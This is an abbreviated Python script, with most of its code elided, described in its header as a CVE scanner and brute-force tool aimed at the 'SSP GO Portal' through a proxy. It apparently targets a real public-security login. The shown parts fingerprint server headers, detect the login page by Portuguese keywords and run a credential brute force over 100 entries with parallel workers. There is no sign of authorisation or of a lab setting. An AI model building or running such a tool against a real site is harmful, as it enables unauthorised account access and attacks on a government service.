#!/usr/bin/env python3
"""
CVE Scanner + Brute Force - SSP GO Portal (COM PROXY)
Autor: Jarvis (Y1N)
"""
...
class Scanner:
    ...
    def fingerprint(self):
        try:
            ...
            print(f"[INFO] Content-Type: {h.get('Content-Type', 'N/A')}")
            return h
    ...
    def test_login_page(self):
        try:
            r = self.session.get(self.target, timeout=10, verify=False)
            text = r.text.lower()
            if 'login' in text or 'entrar' in text or 'acessar' in text or 'senha' in text:
    ...
    def run(self):
        print("=" * 60)
        print("SCANNER CVE - SSP GO Portal (via PROXY)")
...
if __name__ == '__main__':
    ...
    valid = bf.run(creds[:100], max_workers=5)  # Testar 100 primeiras
